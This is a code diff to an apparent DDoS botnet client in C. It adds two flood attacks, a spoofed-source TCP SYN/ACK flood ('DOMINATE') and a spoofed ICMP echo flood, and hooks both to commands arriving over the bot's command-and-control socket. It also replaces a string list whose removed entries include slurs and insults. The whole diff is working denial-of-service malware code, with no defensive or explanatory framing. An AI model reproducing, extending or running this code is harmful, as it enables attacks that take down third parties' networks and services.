@@ -5,6 +5,7 @@
 //  Improved HTTP Flood By Scarface
 //  Binarys & Ranges Added By By Scarface
 //  Release date 27/3/2018 - by Scarface
+//  FAKIU Methods added By Echo503
 
 #include <stdlib.h>
 #include <stdarg.h>
@@ -23,6 +24,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netinet/tcp.h>
+#include <netinet/ip_icmp.h>
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
@@ -4604,7 +4606,7 @@ break;
 }
 }
 
-void sendSTD(unsigned char *ip, int port, int secs) {
+void SendSTD(unsigned char *ip, int port, int secs) {
 int iSTD_Sock;
 iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
 time_t start = time(NULL);
@@ -4617,7 +4619,7 @@ sin.sin_family = hp->h_addrtype;
 sin.sin_port = port;
 unsigned int a = 0;
 while(1){
-char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisacrackaddict", "satoriskidsnet"};
+char *randstrings[] = {"5Dqkns8ZmkZrstoN", "p8bB4mFiWc9POPRg", "2R4zlh3dYVbz8Orc", "RVIZAJP029Avtccg", "HoKuF5I5MxQJAA77", "Sx63XeZJjtcJsKIC", "DK79GTx89xdOOtvr", "TauFSw5stOstvb73", "9MFGq3kNUUnI8Wid", "bi8PJS4xa7l3g9DO", "IVOJERmeZuW88KHa", "0zwLKQ1M7BBxVBMz", "4cOmVHkiw8uFXWEj", "n3M9cSND5jKf0AqM", "lK61peIJkuVdBeM4", "fg5q8VpCKW4TUVok", "jgR5i0UwBXSz2Rza", "aANQPCqi81nKbTri", "7cnCSFUe42vfIgln", "tQqFjXTj5wtMkC00", "fWuzuiLdgFzwEYgg", "e7o89VPK0ZsWo1A6", "SnCp1QQZlTYNnCtq", "6g123exBhX7t5HiV", "Opj8ip8JfHu5wmTS", "hiTD4IGqkc1kdgTH", "Fc5mQD6QOd1rBKQS", "0ExkUMenkaplzzbR", "HsZJaNZyUG2qlHTI", "pHL8Oi3M1ooNmaoi", "t24GDJckRqM4SAnY", "iNkibRCNExJrJHH5", "LzoE9GQRoIgqU9Ro", "zXa2cMQRsgJ2f0P3", "Ep0Ub6BV7GOefz6p", "pIxX5wGvzefSwNgW"};
 char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
 if (a >= 50)
 {
@@ -4765,6 +4767,134 @@ int socket_connect(char *host, in_port_t port) {
 	if (sock == -1) return 0;
 	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
 	return sock;
+}
+void SendDOMINATE(unsigned char *target, int port, int timeEnd, int pollinterval)
+{
+	register unsigned int pollRegister;
+	pollRegister = pollinterval;
+	struct sockaddr_in dest_addr;
+	dest_addr.sin_family = AF_INET;
+	if(port == 0) dest_addr.sin_port = rand_cmwc();
+	else dest_addr.sin_port = htons(port);
+	if(getHost(target, &dest_addr.sin_addr)) return;
+	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+	if(!sockfd)
+	{
+		sockprintf(mainCommSock, "Failed opening raw socket.");
+		return;
+	}
+	int tmp = 1;
+	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
+	{
+		sockprintf(mainCommSock, "Failed setting raw headers mode.");
+		return;
+	}
+	in_addr_t netmask;
+	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
+	struct iphdr *iph = (struct iphdr *)packet;
+	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
+	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr));
+	tcph->source = rand_cmwc();
+	tcph->seq = rand_cmwc();
+	tcph->ack_seq = 0;
+	tcph->doff = 5;
+	tcph->syn = 1;
+	tcph->window = rand_cmwc();
+	tcph->check = 0;
+	tcph->urg_ptr = 0;
+	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
+	tcph->check = tcpcsum(iph, tcph);
+	iph->check = csum ((unsigned short *) packet, iph->tot_len);
+	int end = time(NULL) + timeEnd;
+	register unsigned int i = 0;
+	register unsigned int n = 0;
+	while(1)
+	{
+		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));	
+		if(n == 0){
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 512;
+			memcpy((void *)tcph + sizeof(struct tcphdr), "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 512);
+			tcph->syn = 0;
+			tcph->ack = 1;
+			n++;
+		}
+		else if (n == 1){
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+			tcph->syn = 1;
+			tcph->ack = 0;
+			n = n - 1;
+		}
+		tcph->res2 = (rand() % 3);
+		tcph->psh = rand() % 3 - 1;
+		tcph->urg = rand() % 3 - 1;
+		iph->saddr = htonl( getRandomIP(netmask) );
+		iph->id = rand_cmwc();
+		tcph->seq = rand_cmwc();
+		tcph->source = rand_cmwc();
+		tcph->check = 0;
+		tcph->check = tcpcsum(iph, tcph);
+		iph->check = csum ((unsigned short *) packet, iph->tot_len);
+		if(i == pollRegister)
+		{
+			if(time(NULL) > end) break;
+			i = 0;
+			continue;
+		}
+		i++;
+	}
+}
+void SendICMP(unsigned char *target, int timeEnd, int pollinterval)
+{
+	register unsigned int pollRegister;
+	pollRegister = pollinterval;
+	struct sockaddr_in dest_addr;
+	dest_addr.sin_family = AF_INET;
+	if(getHost(target, &dest_addr.sin_addr)) return;
+	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+	if(!sockfd)
+	{
+		sockprintf(mainCommSock, "Failed opening raw socket.");
+		return;
+	}
+	int tmp = 1;
+	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
+	{
+		sockprintf(mainCommSock, "Failed setting raw headers mode.");
+		return;
+	}
+	in_addr_t netmask;
+	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
+	struct iphdr *iph = (struct iphdr *)packet;
+	struct icmphdr *icmph = (void *)iph + sizeof(struct iphdr);
+	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_ICMP, sizeof(struct tcphdr));
+	icmph->type = ICMP_ECHO;
+    icmph->code = 0;
+    icmph->un.echo.sequence = rand();
+    icmph->un.echo.id = rand();
+    icmph->checksum = 0;
+	iph->check = csum ((unsigned short *) packet, iph->tot_len);
+	int end = time(NULL) + timeEnd;
+	register unsigned int i = 0;
+	while(1)
+	{
+		memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, 512);
+		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+		icmph->un.echo.sequence = rand();
+		icmph->un.echo.id = rand();
+		icmph->checksum = 0;
+		iph->saddr = htonl( getRandomIP(netmask) );
+		iph->id = rand_cmwc();
+		iph->check = csum ((unsigned short *) packet, iph->tot_len);
+		if(i == pollRegister)
+		{
+			if(time(NULL) > end) break;
+			i = 0;
+			continue;
+		}
+		i++;
+	}
 }
 void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
 	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
@@ -5085,17 +5215,91 @@ while(hi != NULL)
 {
 if(!listFork())
 {
-sendSTD(hi, port, time);
+SendSTD(hi, port, time);
 _exit(0);
 }
 hi = strtok(NULL, ",");
 }
 } else {
 if (listFork()) { return; }
-sendSTD(ip, port, time);
+SendSTD(ip, port, time);
 _exit(0);
 }
 }
+
+if(!strcmp(argv[0], "DOMINATE"))
+	{
+		if(argc < 5 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) < 1))
+		{
+			return;
+		}
+
+		unsigned char *ip = argv[1];
+		int port = atoi(argv[2]);
+		int time = atoi(argv[3]);
+		int pollinterval = argc == 8 ? atoi(argv[4]) : 10;
+
+		if(strstr(ip, ",") != NULL)
+		{
+			sockprintf(mainCommSock, "DOMINATE Flooding %s for %d seconds.", ip, time);
+			unsigned char *hi = strtok(ip, ",");
+			while(hi != NULL)
+			{
+				if(!listFork())
+				{
+					SendDOMINATE(hi, port, time, pollinterval);
+					close(mainCommSock);
+					_exit(0);
+				}
+				hi = strtok(NULL, ",");
+			}
+		} else {
+			if (listFork()) { return; }
+
+			sockprintf(mainCommSock, "DOMINATE Flooding %s for %d seconds.", ip, time);
+			SendDOMINATE(ip, port, time, pollinterval);
+			close(mainCommSock);
+
+			_exit(0);
+		}
+	}
+	
+if(!strcmp(argv[0], "ICMP"))
+	{
+		if(argc < 4 || atoi(argv[2]) == -1)
+		{
+			return;
+		}
+
+		unsigned char *ip = argv[1];
+		int time = atoi(argv[2]);
+		int pollinterval = argc == 8 ? atoi(argv[3]) : 10;
+
+		if(strstr(ip, ",") != NULL)
+		{
+			sockprintf(mainCommSock, "ICMP Flooding %s for %d seconds.", ip, time);
+			unsigned char *hi = strtok(ip, ",");
+			while(hi != NULL)
+			{
+				if(!listFork())
+				{
+					SendICMP(hi, time, pollinterval);
+					close(mainCommSock);
+					_exit(0);
+				}
+				hi = strtok(NULL, ",");
+			}
+		} else {
+			if (listFork()) { return; }
+
+			sockprintf(mainCommSock, "ICMP Flooding %s for %d seconds.", ip, time);
+			SendICMP(ip, time, pollinterval);
+			close(mainCommSock);
+
+			_exit(0);
+		}
+	}
+
         if(!strcmp(argv[0], "STOP"))
 		{
                 int killed = 0;
